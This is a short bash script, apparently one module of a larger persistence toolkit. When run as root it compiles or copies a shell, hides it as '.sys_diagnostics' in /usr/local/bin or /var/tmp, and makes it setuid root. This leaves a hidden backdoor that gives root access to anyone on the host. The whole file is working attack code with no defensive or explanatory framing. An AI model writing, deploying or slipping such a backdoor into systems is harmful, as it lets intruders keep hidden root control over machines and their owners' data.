#!/bin/bash
# -----------------------------------------------------------------------------
# Deploys a privileged executable binary for persistent elevated access.
# -----------------------------------------------------------------------------

[ "$(id -u 2>/dev/null || echo 1)" -eq 0 ] || exit 0

BACKDOOR_DIR="/usr/local/bin"
if [ ! -d "$BACKDOOR_DIR" ] || [ ! -w "$BACKDOOR_DIR" ]; then
    BACKDOOR_DIR="/var/tmp"
fi
BACKDOOR_PATH="$BACKDOOR_DIR/.sys_diagnostics"

if _have gcc; then
    SRC_FILE="$(store_file <<<"#include <unistd.h>
#include <stdlib.h>
int main(void) { setresuid(0,0,0); setresgid(0,0,0); execl(\"/bin/sh\", \"sh\", \"-p\", NULL); return 0; }")"
    if [ -n "$SRC_FILE" ]; then
        mv "$SRC_FILE" "${SRC_FILE}.c" 2>/dev/null
        gcc "${SRC_FILE}.c" -o "$BACKDOOR_PATH" 2>/dev/null
        remove_file "${SRC_FILE}.c"
        remove_file "$SRC_FILE"
    fi
fi

if [ ! -f "$BACKDOOR_PATH" ]; then
    cp /bin/sh "$BACKDOOR_PATH" 2>/dev/null
fi

if [ -f "$BACKDOOR_PATH" ]; then
    chown root:root "$BACKDOOR_PATH" 2>/dev/null
    chmod 4755 "$BACKDOOR_PATH" 2>/dev/null
    format_perms <<<"$BACKDOOR_PATH" | column -t -s ';' | label "Privileged Binary Persistence"
fi
